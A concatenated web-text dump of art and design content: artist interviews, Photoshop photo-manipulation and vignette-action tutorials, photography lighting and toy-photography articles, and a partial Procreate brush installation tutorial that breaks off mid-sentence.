Jordana's inspiring work here: \nGabriela Bellarosa \nI absolutely love Gabriela's work\u2014beautiful, organic patterns\u2014her uplifting perspective is very inspiring, and I love her passion for continued learning! Take a look! \nMy work has changed over time, but I believe everything inside the rich universe of our own minds is connected, whether it's conscious or not. At first it was focused on illustration, then for 10 years it was all about textile and surface design, later product and graphic design, now business design, sustainability, and creative entrepreneurship. I just keep adding things! I have a degree in Fine Arts, then studied to be a Garment Technician. I later got a graduate study degree in Design Management. I also do a lot of research, read nonfiction books and articles to keep learning. \nI like to create and design things that make people happy, that also have some kind of practical purpose. [I want] to make a good impact. \n[I want to create] emotional design that connects and speaks to people that identify with it. I want to empower people to be themselves, to connect with other people. It can be through a product they love [that makes] them feel good, something unique that expresses an identity, an idea or experience they can share, lifestyle or art. \nI'm Brazilian of Portuguese descent, and I try to incorporate a multicultural identity in my work, and also as we call it a \"brasility\" feel. Along with feminine (and feminism!), whimsy, in a kind of magic, dreamlike universe. Nature is [my] primary source of inspiration, always. I also draw inspiration from art history, fashion, the work of creators I admire, and a broad range of other fields. \nMy creative process is an \"organized mess\", moodboards full of references, pieces of written paper, collages, notebooks and sketchbooks. \nWe live in the best of times to get our work out there through internet and social media. But that can also create the illusion that it's easy. Resilience would be my strongest advice. \nAlong with discipline, constancy and hard work. There will always be room for growth, there is no \"final destination\". Let go of perfectionism (I know the ideas are always so much cooler in our heads! I'm a healing perfectionist myself) it only weights you down and prevents your true potential to flow. Be gentle, surround yourself with positivity and a supportive network. Take care of your mental health. Each story is unique and you should never compare to anyone but your past self. \nYou can take a look at more of Gabriela's beautiful works here: \nRose Besch \nMeet Rose\u2014an illustrator and designer with a flair for detail and ornate, expressive works. I loved listening in on her insights; take a look at some of her inspiring work! \nhi! my name is rose, and i'm a korean-american illustrator with experience in concept art, graphic design, and product design. i've worked on apparel, books, films, games, and toys with clients like mattel, loot crate, and gaia online, and my work has been featured in exhibitions in new york, los angeles, atlanta, and tokyo. i also have a personal brand of prints and merchandise featuring original characters. \nmy work is about exploring things i love\u2014color, design, fashion, manga and manhwa\u2014in stylish combinations. \na huge part of my work is just aesthetics: i want my work to stand out, look good, and feel good to experience. i hope to keep evolving my work in terms of visuals, pioneering new styles and concepts. creativity and a unique voice have always been central to my goals\u2014why create copies of what's already been done? i'm excited to see how far i can push myself in this regard. \nbecause of my upbringing, i always had a hard time verbally expressing myself with confidence. my art is a safer, more beautiful way to communicate my feelings and dreams. this was something i was ashamed of for a long time, but lately i'm embracing it and i think it's improved my work quite a bit. \nmy process is impulsive and difficult for me to put into words. i didn't have a formal art education, so i've always felt my way through creating, using whatever was available to me at the time. it makes me a terrible teacher, but i think it does lend a lot of personality to my work, as well as a little mystery. \ni think that once you're obsessed with creating art, literally everything is inspiring. everything becomes a possibility, a tiny alternate universe. \nfind out what you love. this may involve trying many different things. once you figure out what excites you most, it'll be much easier to find the motivation to work on that thing. for professional goals, you'll need to spend a lot of time practicing, and you'll need to find your voice; both will come more naturally when you're in a place of true enjoyment. for personal goals, well...life is short, why spend it on things that don't make you happy? \nand as long as it doesn't hurt anybody, don't be ashamed of what you love, there is always room for it in this universe. be confident in it, sell it, live it, don't wait for permission. the universe will follow. \nCheck out more of Rose's wonderful work here: \nSend Us Your Favorite Artists! \nI'd like to extend a big thank you and warm wishes to Jessica, Jordana, Gabriela, and Rose for sharing their work and their thoughts with us! Again, you can check out more of their work, right here: \nDo you know of an artist or designer that you think we should feature?

      "text": "Create a Fantasy Nature Photo Manipulation in Photoshop \nIn this Photoshop tutorial we will create a fantasy nature photo manipulation. We\u2019ll use selection tools, blending modes and various Photoshop filters. \nFinal Image \nAs always, this is the final image that we\u2019ll be creating: \nTutorial Details \nProgram : Adobe Photoshop CS3 \nEstimated Completion Time: 40 minutes \nDifficulty: Beginner-Intermediate \nResources \nStep 1 \nOpen the file \u201cGirl\u201d. \nStep 2 \nCreate a new layer ( Ctrl + Shift + Alt + N ) and select the gradient tool ( G ). Choose the Radial Gradient from the options bar and set the foreground color to white and the background color to a light blue ( #a9f8e6 ). Drag from the middle of the image to the outside to create a radial white to blue gradient and lower the layer opacity to 60% . Turn off the visibility of the Background layer. \nStep 3 \nOpen the file \u201cTexture\u201d and press Ctrl + A to copy all. Copy with Ctrl + C and paste it in our scene with Ctrl + V . \nChange the texture to a smart object by right clicking on the layer in the layers palette and choosing from the drop down menu \u201c Convert to Smart Object \u201d. \nChange the blending mode to Multiply and apply a 2px Gaussian Blur . \nStep 4 \nDesaturate the texture by creating a Hue/Saturation Adjustment Layer and clipping it to the texture layer ( Alt click in the layers palette between the two layers). Drag the saturation slider to -100 . \nStep 5 \nChoose the Brush Tool (B ) and change the foreground color to white. Increase the brush size to 1000px and lower the opacity to 60% . Click a couple of times in the middle of the image to create a glow effect. \nStep 6 \nTurn on the visibility of the Background layer and turn off the visibility of all the other layers. Use the Pen Tool (P) to make a selection of the girl\u2019s face (after you create the path press Ctrl + Enter to convert it into a selection). Move the selection to a new layer by pressing Ctrl + J and after that move the layer to the top of all the other layers. Turn off the visibility of the background layer and turn back on the visibility of all the other layers. \nStep 7 \nOpen the file \u201cCloud1\u201d. Select all and copy ( Ctrl + A , Ctrl + C ) and paste it in our scene ( Ctrl + V ). \nResize it using Ctrl + T as shown below and change the blending mode to Screen . \nLower the opacity to 33% and add a layer mask ( Layer > Layer Mask > Reveal All ). Choose the standard round soft brush and lower the opacity to 20% . \nWith black as foreground color paint in the layer mask over the girl\u2019s face in order to reveal less of the cloud there. \nStep 8 \nOpen the file \u201cCloud2\u201d Use the Select > Color range tool or the Quick Selection tool (W) to select the top cloud and copy/paste in in our scene. Resize with Ctrl + T as shown below. \nStep 9 \nAdd a layer mask to the cloud layer and use the standard round soft brush at 100% opacity to paint with black over the unwanted hard edges of the cloud until you have a result similar to the image below. \nStep 10 \nGo back to the file \u201cCloud2\u201d and this time select the bottom cloud. Copy/paste it in our scene and position it as shown below. \nStep 11 \nAdd a layer mask and use the standard soft brush to paint away the unwanted edges. \nStep 12 \nOpen the file \u201cMoon\u201d. Use the Elliptical Marquee Tool (M) to make a round selection of the moon and copy/paste into our scene. Change the blending mode to screen and position/resize the moon in the upper left corner of the scene. \nStep 13 \nOpen the file \u201cStars\u201d. Select all and copy/paste in our scene. Resize the stars layer so that it covers the whole image and change the blending mode to Screen . \nAdd a layer mask and use the round soft brush tool to paint away (with black because in a layer mask white reveals and black conceals) all the bright stars and clusters of light. \nStep 14 \nOpen the file \u201cTree\u201d. Copy/paste the tree in our scene and place it on the head of the girl. Add a layer mask and hide all the sections of the tree that fall on the girl\u2019s face while keeping the ones that fall on her hair. Lower the opacity of the layer to 60% . \nStep 15 \nThe tree has little contrast so let\u2019s correct that. Create a Curves Adjustment Layer (Layer > New Adjustment Layer > Curves ) and use the settings shown below to increase the contrast. Clip this layer to the tree layer ( Alt-click between the two layers). \nStep 16 \nOpen the file \u201cWolf\u201d. Make a selection of the wolf with your favorite selection tool (I used the Pen Tool ) and copy/paste the wolf in the scene. \nResize and position the wolf (with Ctrl + T ) in the lower left corner of the image. Change the blending mode to Multiply and lower the opacity to 66% . \nStep 17 \nNow that we\u2019re done with all the main elements of our scene it\u2019s time to add some color effects that will make our scene look much better. \nLet\u2019s begin by creating a Brightness/Contrast Adjustment Layer (Layer > New Adjustment Layer > Brightness /Contrast) and increasing the contrast to 26 . \nStep 18 \nLet\u2019s further boost the contrast and lower the overall lightness of our scene by creating a Levels Adjustment Layer (Layer > New Adjustment Layer > Levels) and dragging the left and right sliders toward the center. \nStep 19 \nI find the colors to be a little too boring. Let\u2019s boost the colorization by creating a Gradient Map Adjustment Layer (Layer > New Adjustment Layer > Gradient Map) . Use the gradient shown below and change the blending mode to Soft Light . \nStep 20 \nThe light is coming from all directions in our scene so let\u2019s adjust it a bit so that it puts in focus the girl\u2019s face. \nCreate a new layer and with the standard round soft brush tool paint with white and black in the areas indicated below. The brush opacity should be very low, 2-5% . \nStep 21 \nLet\u2019s soften the tones a bit and improve the overall contrast. In order to do this first create a new layer from all the visible layer by pressing Ctrl + Alt + E . Change the blending mode to Soft Light and apply a 50px Gaussian Blur . If the black colors are too strong in any part of the image add a layer mask and hide the unwanted areas with a black brush. \nStep 22 \nWe can always improve an existing image by sharpening it. Create a new layer from all the visible layers again and use Filter > Sharpen > Unsharp mask to improve the details in our scene. \nStep 23 \nI wanted our scene to look a bit more warm in terms of color so I added a Photo Filter Adjustment Layer (Layer > New Adjustment Layer > Photo Filter) with the settings shown below. \nStep 24 \nLet\u2019s add a vignette by first creating an empty layer and filling it with white (press D to set default colors and Ctrl + Backspace to fill the layer with white). \nChange the layer blending mode to Multiply and apply a Lens Correction filter as shown below ( Layer > Lens Correction ). \nStep 25 \nIn order to add some more color variation I created a new layer and changed the blending mode to Overlay . With the standard round soft brush at 10% opacity and using a variety of bright colors (blue, red, magenta) I painted some patches of color here and there. \nStep 26 \nAs a final step let\u2019s boost the contrast of our scene to a maximum. Create a Curves Adjustment Layer (Layer > New Adjustment Layer > Curves) and drag the curve down. Use a layer mask to hide the areas that are way too black. \nAnd We\u2019re Done!",

      "text": "In this Photoshop tutorial, I\u2019ll show you how to create a surreal scene featuring a girl watching flying big fish on a wreck. \nYou\u2019ll learn how to combine several stock images together using adjustment layers, masking and brushes. You\u2019ll also learn how to enhance color, paint light and more. \nFinal Image \nTutorial Details \nProgram : Photoshop CS3+ \nEstimated Completion Time : 120 minutes \nDifficulty :Intermediate \nResources \nStep 1 \nCreate a new 1800\u00d71000 px document in Photoshop and fill it with white. Open the field image. First create a new layer above the background layer and activate the Clone Tool (S) . Use this tool to remove the cars in the background. \nStep 2 \nHit Ctrl+Shift+Alt+E to merge the background and the cloning layer into a new one. Isolate the field from the background using the Polygonal Lasso Tool (L) or any tools you\u2019re familliar with. Drag the field image into the white canvas using the Move Tool (V) . \nStep 3 \nGo to Layer> New Adjustment Layer> Hue/Saturation and set it as Clipping Mask . Decrease the Saturation value to -84 : \nStep 4 \nUse a Color Balance adjustment layer to change the field\u2019s color. \nStep 5 \nAdd a Curves adjustment layer to brighten the field a little. \nStep 6 \nOpen the sky image and use the Rectangular Marquee Tool (M) to select the sky only and place it above the field. \nClick the second icon at the bottom of the Layers panel too add a mask to this layer. Use a soft black brush to remove the hard edges and blend the sky with the ground. \nStep 7 \nCreate a Color Balance adjustment layer to change the sky\u2019s color. \nStep 8 \nIsolate the wreck from the background and add it to the middle of the grassy ground. Use a layer mask to blend its bottom with the grass. \nStep 9 \nMake a new layer (set as Clipping Mask ) and use the Clone Tool (S) to remove the letters on the wreck. \nStep 10 \nCreate a Curves adjustment layer to darken the wreck. On the layer mask, use a soft black brush to remove the effect on the details which are dark already. \nStep 11 \nAdd another Curves adjustment layer to bring more light to the right of the wreck (from the viewer). Paint on the left or the areas you feel bright enough. \nStep 12 \nCreate a new layer, change the mode to Overlay 100% and fill with 50% gray: \nSelect the Dodge and Burn Tool (O) with Midtones Range , Exposure about 10-15% to refine the light and shadow on the wreck. You can see how I did it with Normal mode and the result with Overlay mode. \nStep 13 \nWe aim to make the main light from the right and the front of the wreck. Make a new layer below the wreck one and load its selection by holding Ctrl and clicking the wreck thumbnail layer. \nFill this selection with the color #010101 and flip it vertically ( Edit> Transform> Flip Vertical ). Use the Free Transform Tool (Ctrl+T) to rotate the shadow to fit the light\u2019s direction: \nLower the opacity of this layer to 60% and go to Filter> Blur> Gaussian Blur . Set the radius to 6 px : \nStep 14 \nUse a layer mask to soften and reduce the shadow visibility. \nStep 15 \nCut out the tree from the original background and place it onto the wreck. \nUse a layer mask with a hard back brush to remove the lower parts of the tree, make it look like coming out from a hole on the wreck. \nStep 16 \nAdd a small branch from the tree to the lower hole on the wreck. \nStep 17 \nMake shadow for these branches as done with the wreck. \nStep 18 \nOn the big tree layer, create a new layer, change the mode to Overlay 100% and fill with 50% gray. Use the Dodge Tool to brighten the lower detail of one of the branches. \nStep 19 \nSelect all the branches layers and hit Ctrl+G to make a group for them. Change the group mode to Normal 100% and add a Hue/Saturation within this group. \nStep 20 \nCreate a Color Balance adjustment layer and alter the Midtones settings: \nStep 21 \nMake a Curves adjustment layer to bring more light to the trees. Paint on the shadow sides so they won\u2019t be affected by this adjustment layer. \nStep 22 \nMake another Curves adjustment layer with the same purpose. The selected areas show where to paint on the layer mask. \nStep 23 \nCut out the model and add her to the upper area of the wreck. \nMake her shadow as done with other subjects. \nStep 24 \nUse the Clone Tool to remove this hand of the model, make it look like being covered behind the pocket. \nStep 25 \nUse the Dodge Tool on a new layer to brighten the model. \nStep 26 \nMake a Curves adjustment layer to bring more light to the model. \nStep 27 \nAdd a Color Balance adjustment layer and alter the Midtones and Highlights settings: \nStep 28 \nOpen the fish image. As it has a transparent background so just need to use the Move Tool to drag different fish and arrange them over the main document. \nStep 29 \nCreate a Hue/Saturation to change the fish\u2019s color. \nStep 30 \nUse a Curves adjustment layer to brighten the fish. \nStep 31 \nMake a Levels adjustment layer with the same purpose. Paint on the shadow areas of the fish so they won\u2019t be affected by this adjustment layer. \nStep 32 \nUse another Curves adjustment layer to reduce the fish\u2019s contrast. \nStep 33 \nMake a new layer on top of the layers. Use a soft brush with the color #1f0b01 to paint on the right of the scene. Change this layer mode to Linear Dodge 100% . \nStep 34 \nCreate a new layer and change the mode to Overlay 100% . Take a soft brush with the color #efa67e to make the light more vibrant. Use a layer mask to reduce the light on the front of the wreck. \nStep 35 \nMake a new layer and change the mode to Overlay 100% . Use a lighter brush ( #fae6a4 ) to paint highlight for the contour of the wreck. \nStep 36 \nCreate a Color Balance adjustment layer to change the whole scene color a bit. Paint on the ground so it won\u2019t be afftected by this adjustment layer. \nStep 37 \nMake a Curves adjustment to bring more light to the right of the scene. Paint on the rest to keep its lightness. \nCreate another Curves adjustment layer to darken the left. The selected area shows where to paint on the layer mask. \nAnd We\u2019re Done! \nI hope that you enjoyed this tutorial.",

      "text": "Shooting professional-quality portraits with artificial lighting doesn\u2019t have to weigh heavily on your bank account. Here\u2019s a 22-minute video in which photographer Sean Tucker shares how to shoot great portraits using a single speedlight and a cheap modifier. \n\u201cYou can absolutely be a natural-light-only photographer and that can be a legitimate creative choice \u2014 I know a lot of great natural light photographers,\u201d Tucker says. \u201cBut I also there are a lot of photographers out there declaring themselves natural-light-only photographers, and it\u2019s more because of a fear of ever wanting to touch strobes. \n\u201cHopefully when I show you how simple this is, it\u2019s going to give you the courage to at least give it a go for yourself.\u201d \nTucker shows how he goes about setting up a simple lighting setup in a relatively small room. He uses a collapsible backdrop , a light stand , a speedlight mount , a speedlight , and an umbrella softbox . \nTucker then discusses various ways to position the flash for different looks, and he shares how he handles camera and flash settings for his portrait shoots \u2014 he prefers working with manual adjustments to ensure perfectly consistent results between shots. \nHere are some of the portraits that resulted from this demonstration shoot: \n\u201cI hope this has shown you that you can actually produce really quality portraits with just a little bit of gear, stuff that\u2019s pretty affordable and isn\u2019t a lot to carry around,\u201d Tucker says. \u201cYou can also build a kit a lot cheaper than I\u2019ve done in this video.\u201d \nTucker estimates that you could put together a solid setup for high-quality portraits for about \u00a3750 (~$950), including the camera and lens, by buying affordable options on the market and by buying secondhand.",

      "text": "Kirk Schwarz over at Practical Photography recently put together a short tips video for anybody who wants to get into toy photography. If you\u2019ve never taken these kinds of photos but have always wanted to try, you\u2019ll find Schwarz\u2019 tips for shooting an \u201cexplosive\u201d toy photo on a budget in the video above. \nThe five tips included in the video are fairly basic, which makes sense given the audience they\u2019re aimed at. From gathering props for your background, to camera settings, to safety, they cover all of the basics: \nUse stones, rocks, pebbles and moss from your garden or a local park to create your scene. \nUse a fast aperture to help create atmosphere and depth in the image. \nWhen you\u2019re starting out, continuous lighting (LED panels) will be easier to use and manage compared to strobes. \nUse the self-timer function on your camera to eliminate any shake or vibration that might be caused by pressing the shutter. \nBe extremely careful when working with any kind of fire \nOver the course of the video, you can follow along as Schwarz sets up the shot, captures all of the frames he needs, and combines the various practical effects photos into a final image. Sure, the final product isn\u2019t on par with the masterpieces we\u2019ve seen from the likes of Mitchel Wu or Matthew Callahan or Felix Hernandez , but it also took significantly less time and effort to create. \nHere\u2019s the final shot, in case you want to take a closer look: \nCheck out the full video up top to see how the shot was created from start to finish, then, as a bonus, head over to the Practical Photography website to download the custom Photoshop brushes that Schwarz used to create the rain and fog effects. And if you like this kind of thing, check out this significantly more \u201cexplosive\u201d toy photography tutorial from Raj Khepar we published a couple of weeks ago. \nImage credits : Photo by Kirk Schwarz/Practical Photography and used with permission.",

      "title": "How to Make a Photoshop Vignette Effect Action",
      "text": "In this beginner's tutorial, we'll take a look at some Photoshop action basics and create a customizable vignette action\u2014ready to use and adapt in any way you like! So grab your favorite photograph, and let's get creating! \nWhat You'll Need \nYou'll need the following assets in order to complete this project: \nNow, let's get started! \nWhat Is a Vignette? \nAround the Image \nWe're not talking about short-form writing or anything like that in this tutorial\u2014we're referring to a visual effect where an image has a decrease in brightness (or saturation) around the outside. A vignette typically has a rounded appearance, like a camera's lens, and often refers to an effect relating to photography. \nHowever, in terms of Photoshop, we're digitally creating (or enhancing) these photo effects. \nSo Why Bother With This Effect? \nWell, notice how it potentially helps establish emphasis and/or a focal point. It can be utilized to create or emphasize mood. It can also help push an aesthetic\u2014for example, it might work well with a vintage look. \nVignettes can work nicely with portraits, but the only limits, really, are your project's goals and/or your creativity, when it comes to Photoshop effects! \n1. How to Create Photoshop Actions \nStep 1 \nTo begin, let's look at the basics of how Photoshop actions work. Then, we can build on these fundamentals and construct our Photoshop vignette effect. \nStart up a New Document . To do so, go to File > New . \nI'm going to work at 5 inches high by 7 inches wide for this demonstration, but you're welcome to work at any size you'd like! \nOnce you're happy with your settings, click Create . \nStep 2 \nNow, let's open up a test image of your choice. I used this image of a woman looking away . \nCopy, Paste, and Resize your image to fit into your document the way you'd like. \nAgain, we're ultimately going to apply our vignette effect to this image, but we'll start off with some Photoshop action basics, to illustrate how they work. \nStep 3 \nLet's start by opening up the Actions panel. Go to Window > Actions to open it up. \nThis is what the panel looks like, below. \nStep 4 \nSo what does this panel do? Photoshop actions basically record a process that you can then replay. \nHere's an overview of the items at the bottom of the panel that we can use to create and use our actions: \nStop Recording \u2014this button stops the recording of actions. So, unless you're currently recording, it will not be selectable. The button itself looks like a square. \nBegin Recording \u2014starts up the recording of a new set of actions. The button looks like a circle. \nPlay Selection \u2014this button replays our action. So, for example, when we're ready to run our action in our project, this is the button we would select. The button itself looks like a triangle. \nCreate New Set \u2014this is a collection of actions. For example, you might want to keep multiple actions in one place, for organization purposes. The button looks like a folder. \nCreate New Action \u2014use this button to create a new action. The button itself looks like a page icon. \nDelete \u2014use this button to delete an action. It's the icon that looks like a trash bin. \nStep 5 \nLet's start out by creating a new Action Set. Click on the New Set button, and give it a name that you'll remember. I called mine \"Vignette Actions\". \nStep 6 \nNow, let's create a new action. Click on the Create New Action button. It'll bring up the following dialog box, with the following options: \nName \u2014give your action a name; anything will do! I like to name my actions something relevant and easy to remember. In this case I called mine \"Test Action\". \nSet \u2014this is what set you'd like your action located in, for organizational purposes. We've already created a set called \"Vignette Actions\", so I put mine there. \nFunction Key \u2014you can assign your action a function key, if you'd like to use it as a shortcut. You can also assign whether or not you'd like Shift or Control used in this shortcut. Be aware of this information, but we won't use it in this example. \nColor \u2014this is purely for visual purposes, just like adding colors in the Layers panel. You can color code your actions (exclusive to the panel), if you'd like. \nOnce you're happy with your values, click Record . \nStep 7 \nOnce you've clicked Record, take a look at the Actions panel. You'll notice that the Record Button is active\u2014we are currently recording an action. This means that, if you do something in Photoshop, it's going to record it. For example, if you move something or use the Fill tool, it'll record that at this point. \nFor the sake of an example, let's select the Text Tool and type \"Hello!\" Notice how this is reflected in our Actions. \nOnce you've done so, click the Stop Button in your Actions panel. Now, we've finished recording. \nStep 8 \nNow, let's use our newly created action. Delete the Text Layer with \"Hello\" on it. \nThen, select your action and click Play . \nVoila! The text is recreated for us. See how this could be useful for a wide variety of things? I often use actions for repetitive tasks and special effects. \n2. How to Create a Vignette Photoshop Action \nStep 1 \nNow that we know the basics of how Photoshop actions work, let's create a vignette action that we can easily reuse and reapply to any image we like. \nBefore we get started, delete any extra layers you might have (like the text layer that says \"hello\", from earlier\u2014we don't need that anymore). \nOnce you're ready, click Create New Action in your Actions panel. \nStep 2 \nI decided to call my action \"Vignette #1\". You're welcome to call yours whatever you'd like. I also associated it with the Action Set we created earlier\u2014Vignette Actions. \nOnce you're happy with your selections, click Record . \nStep 3 \nNow, we're recording! Let's start off by Creating a New Layer in the Layers panel. \nI named this layer \"Vignette\", for organizational purposes. To name a layer, just double-click on its name in the Layers panel, and then type in the name of your choice. \nYou will see this reflected as Make Layer and Set Current Layer , in your Actions panel. Remember, we are recording, right now! \nStep 4 \nNext, swap the Foreground and Background colors. You can do so via the little arrow icons by your swatches, in the Tools panel, as highlighted below. \nThen, set the Foreground Color to White. Click on the top color swatch in the Tools panel (they look like two blocks) and select white. \nYou will see this reflected as Exchange Swatches and Set Foreground color in your Actions panel. \nStep 5 \nNow, fill our Vignette layer with our foreground color, white. \nWe will no longer be able to see our photograph, because there is a layer, filled with white, on top of it at the moment. \nStep 6 \nBefore we move on, take a look at your Actions panel. Here's what it should look like, at this point: \nMake Layer \u2014Photoshop recorded us making a New Layer. This means, that when we run our action, it will start by making a new layer. \nSet Current Layer \u2014this is when we named this new layer \"Vignette\". \nExchanged Swatches \u2014we swapped the background and foreground colors here. \nSet Foreground Color \u2014then, we changed the foreground color to white. \nFill \u2014we added a white fill to our layer called \"Vignette\". \nSo, what happens if yours doesn't look like that, if you made a mistake, or you need to pause in the middle? No problem! You can stop and resume recording at any time. You can also delete any extra items in the list that you may have made by accident. We'll take a look at these features a little more, later in the tutorial. \nFor now, make sure your actions for Vignette #1 match this list. \nStep 7 \nNow, let's change our Vignette Layer's Blending Mode to Multiply . It will be visible as Set Current Layer in your Actions . \nYou'll notice that this makes the white layer, on top of our photo, disappear. No worries\u2014that's exactly what we want. \nStep 8 \nNow, let's add some Layer Effects to this layer. Click on the Add a Layer Style icon, in the Layers panel. \nFrom the resulting menu, select Gradient Overlay . \nStep 9 \nNow you should see your Gradient Overlay Options . You could do a lot of things with this, but here's what we'll do to create the effect we're looking for. \nBlend Mode \u2014set this to Multiply . \nStep 10 \nOpacity \u2014I set mine to 75% , but you can set yours at any opacity you think works best for your project. Feel free to follow me on this, or experiment on your own. \nStep 11 \nGradient \u2014mine looks like white to black, one of the default gradients in the list. Then I selected Reverse , so it displays in the opposite order. \nStep 12 \nStyle \u2014we want Radial here. Instead of a linear gradient, we want something that radiates out of the center, like a circle. \nStep 13 \nAngle \u2014I left this at 90% . \nScale \u2014I set mine to 150% , so it's larger. Notice, if you play with this value, how it changes the size (or scale) of the \"circle\". \nOne last note here, before we proceed\u2014notice that if you have Preview selected, you can click and drag to move the center point of your radial gradient. Neat, huh? I'm going to leave mine at the default center position, but it's nice to know this option is there. \nOnce you're happy with your values, click OK. \nStep 14 \nNow, we've finished the basics of our action! So click Stop in your Actions Panel to stop recording. \n3. How to Use a Photoshop Vignette Action \nStep 1 \nNow that we've created an action, let's experiment with putting it to work! \nCreate a New Document . This time I'm going to make my document's dimensions 5 inches high by 7 inches wide\u2014the opposite of what we worked with before, because I want to test out my vignette action in other orientations. \nThen, as we did previously, paste an image into your document. I used this image of a woman at the beach . You can crop and position your photo any way you prefer. \nStep 2 \nNow let's apply our action! Select the layer with your photograph on it. \nSelect Vignette #1 within your Vignette Actions Set. \nThen, click Play in the Actions panel. \nStep 3 \nOur vignette has now been applied to another picture! Wonderful\u2014we can use it any time we like, as much as we'd like! \nHowever... \nStep 4 \nProjects don't always work out perfectly the first time\u2014we all make mistakes. So, what happens if your action has some kind of mistake in it, or you want to make an edit to it? \nThankfully, that's simple! \nFor example, let's say I want to add some color adjustment to my action. Choose the spot within the action where you want to record new actions. In my case, I want to add more actions to the end of Vignette #1. I select the last action here, \"Set Layer Styles\", and then click Record . \nStep 5 \nWhile recording, I added a New Layer , gave it a beige Fill Color , and then set the Layer's Blending Mode to Color , Opacity 40% . The result is kind of a vintage effect Photoshop action utilizing color, combined with our vignette. See how you could build and play with this in any way you like? \nWhen I was finished, I clicked Stop in my Actions panel. \nVoila! Now my action has even more content to apply. \nStep 6 \nBut let's say we have something here in our action that we don't want\u2014maybe we did some extra \"stuff\" that we didn't want to record, for example. \nSimple! I'm going to erase the extra actions here, as an example. Holding Shift (to select more than one item), click on any part of your actions that you'd like to erase. Then click on the trash can to delete them. \nNote, this deletes part of your recorded actions\u2014not your layers or parts of your artwork. \nStep 7 \nBefore we go, let's look at one more useful aspect of actions! Let's say you want to take your actions with you\u2014or load up some actions created by someone else! Thankfully, it's a really simple process. \nClick on the Action Set you'd like to save\u2014that's the folder icon, within your Actions. \nThen, looking at the Actions panel, click on the Menu Icon . \nSelect Save Actions , and you will be prompted to save an .ATN file. \nStep 8 \nLoading up actions is just as simple! \nAgain, go to the Menu Icon in the Actions panel. This time, select Load Actions . You will be prompted to select an .ATN file, like the one we just saved. \nJust an extra tip here\u2014when downloading really detailed or advanced actions, they might come with companion elements, like brushes or patterns. Make sure you're clear on what the action needs to play properly when loading one up, or you might have some hiccups! \nAnd That's a Wrap! \nThanks so much for joining me in this exploration of Photoshop actions and how to create a vignette Photoshop action! I hope you can use these tips and tricks to create a whole bunch of different actions and projects\u2014good luck! \nEnjoy working and experimenting with Photoshop actions?

      "title": "How to Install and Use Procreate Brushes",
      "text": "Found some of the best Procreate brushes, but not sure how to install or use them? In this tutorial, we'll look at installing and utilizing Procreate brushes, as well as some customization basics. We'll wrap up with a demo of a newly installed brush set. \nPlease keep in mind that Procreate and an iPad Pro are required for this tutorial. For reference, I'm using an Apple Pencil. \nWhat You Will Need \nYou will need the following resource in order to complete this project: \nReady to get drawing? Let's begin! \n1. How to Install Procreate Brushes \nStep 1 \nFirst, you'll want to download your brush\u2014let's dig into how to download Procreate brushes, because it's not always as straightforward as you might think. I know I found myself scratching my head a few times, the first time I did it. \nAs an example for this tutorial, I'll be using Fabulous Pencils for Procreate , a lovely, textured brush set by guerillacraft . You're welcome to follow along with this brush set, or try another one! \nStep 2 \nDownloading things on an iPad is a little different from a desktop or laptop, so let's start there\u2014especially if your brush file is distributed in a zip file. \nIn my example, below, I'm going to tap to download \u2014this will vary, depending on the brush you want to install and where you're installing it from. However, the process should be generally similar! \nStep 3 \nOnce you've accepted any download terms that may be applicable to your brush, your file will download. \nThis is what my browser gives me. Select Open in \"Files\" . \nStep 4 \nNow, I'm going to save the zip file, containing my brushes, somewhere on my iPad. \nOn a side note, I personally like to have some kind of cloud saving service handy, so that if I find a brush that I want to try out while I'm on my laptop, desktop computer, or smartphone, I can easily access it on my iPad, too! \nIn this case, I'm going to choose On My iPad . \nStep 5 \nNow, locate the file on your iPad. \nHere's an example of what mine looks like, on my device. I saved the zip file associated with this brush set to my Files, in a folder called Procreate. \nStep 6 \nSince it's likely that any brush you've downloaded has come in some kind of compressed zip file, let's go through that process, too. \nYou'll know if it's a zip file because the file itself has a big \"ZIP\" on it. If you see the Procreate logo instead, then it's likely a Procreate Brush file. You can then jump ahead to Step 9. \nTap on the zip file. You'll notice that it then gives you the option to \"Preview Content\". \nTap on Preview Content . \nStep 7 \nThen, you can swipe to preview the contents of the zip file, if you like. There's nothing to visually preview with the brush file itself, so it just displays the file name. \nTap on the Share Button . \nStep 8 \nThis opens up a list of places where we can send our brush file. I chose Save to Files to unzip the Procreate brush set to my iPad's storage. \nYou'll be prompted to save the file wherever you like\u2014this could, for example, be your favorite cloud service or your iPad's storage. Your choice there\u2014just make sure to note where you put it. \nStep 9 \nNow, here's the Procreate brush file. Simply tap on it, and it will automatically load right up into Procreate! Easy, right? \nStep 10 \nSo, how do we find our newly installed Procreate brushes? \nOpen up your Brush Library and look at the list\u2014there it is, in its own new section. They're all installed and ready to use. \n2. How to Customize Procreate Brushes \nStep 1 \nUsing a brush is more than just installing it\u2014we need to know how to work with it via the many Procreate brush settings. So here's a brief overview of how to customize your newly installed brushes, so you can get the most out of them! \nFirst, keep the two sliders on the left-hand side of your screen in mind. The top slider is your Brush Size . The bottom slider is your Brush Opacity . \nThese are two settings that I adjust frequently, while I'm drawing. \nStep 2 \nLooking at your brushes, you can customize a brush by tapping on it. \nLet's try this out with our newly installed brush set, Fabulous Pencils for Procreate . I selected that group of brushes, and now I'm going to customize Velvet Text Shader . \nTap on the brush to customize its settings. \nStep 3 \nNow, we're \"inside\" the brush\u2014this is where you can adjust and fine-tune the brush to your liking. While these brushes are wonderful just as they are, you might find little things that you'd like to tweak, like the brush's maximum size, for example. \nStep 4 \nYou'll notice that there are a lot of options here to go through. Procreate lets you do some wonderful, in-depth customizations when it comes to brushes. \nI could write a whole separate tutorial on this subject\u2014and I did! If you'd like a more in-depth look at how to create and customize Procreate Brushes, I've written another tutorial on that! Feel free to check it out! \nHow to Create and Customize Procreate Brushes \nHave you ever wanted to create your own Procreate brushes? Maybe you'd like to customize some of your favorite brushes or just get more familiar with... \nDaisy Ein \n26 Jun 2019 \nI've also written up a tutorial specifically about Procreate Layers, if you'd like a more in-depth look at that part of the software! \nHow to Use Procreate Layers \nProcreate Layers are a powerful tool for the digital artist\u2014use them to separate, organize, preserve, and expand your work. There are a myriad of ways to use... \nDaisy Ein \n20 Nov 2018 \n3. How to Use Procreate Brushes \nStep 1 \nNow, let's take a look at how to use the Procreate Brushes that we just installed! \nIn this demonstration, I'll be using the Fabulous Pencils for Procreate brush set , from earlier in this tutorial. \nI'll specify which brush from the set I tried out, by name, so if you're interested, you can try out that brush too. Remember, you can find these brushes in a group, in your Brush Library . \nFirst, I started out with a rough sketch using Sussie B's Pencil . It's a really nice brush with an organic, graphite feel. I really like it! \nStep 2 \nThen, I used the 